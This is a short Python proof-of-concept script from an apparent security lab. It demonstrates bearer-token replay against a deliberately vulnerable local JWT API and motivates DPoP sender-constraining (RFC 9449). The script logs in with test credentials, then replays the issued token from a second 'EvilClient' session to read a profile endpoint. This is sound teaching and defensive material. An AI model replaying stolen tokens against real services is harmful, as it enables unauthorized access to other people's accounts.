#!/usr/bin/env python3
"""
Attack: Unconstrained Bearer Token Replay (No Proof-of-Possession)
Target: System 5 vulnerable JWT API (http://localhost:5008)
Demonstrates: The token is a pure bearer credential - any party holding the
              string is accepted, with no requirement to prove they are the
              client it was issued to. This is the gap DPoP closes.
Reference: RFC 9449 (DPoP) - sender-constraining tokens to a client key.
"""

import requests

TARGET = "http://localhost:5008"


def main():
    print("[*] Attack: bearer token replay from an unrelated client")
    print("[*] Target:", TARGET)

    # Legit client logs in (its own session, its own User-Agent).
    legit = requests.Session()
    legit.headers["User-Agent"] = "LegitApp/1.0 (issued-to-this-client)"
    r = legit.post(f"{TARGET}/login",
                   json={"username": "alice", "password": "password123"})
    tok = r.json()["access_token"]
    print("[*] Token issued to LegitApp/1.0")

    # Attacker is a completely different client - different session, different
    # User-Agent, no shared key material with the original client. With a pure
    # bearer token, none of that matters.
    attacker = requests.Session()
    attacker.headers["User-Agent"] = "EvilClient/6.6 (stole-the-token)"
    resp = attacker.get(f"{TARGET}/api/profile",
                        headers={"Authorization": f"Bearer {tok}"})
    print(f"[*] EvilClient/6.6 replays the token -> HTTP {resp.status_code}")

    if resp.status_code == 200:
        print("\n[+] Attack succeeded. The server accepted the token from a")
        print("    client that could not prove possession of any key. There is")
        print("    nothing binding the token to its rightful holder - exactly")
        print("    the property a sender-constraining mechanism (DPoP) adds.")


if __name__ == "__main__":
    main()
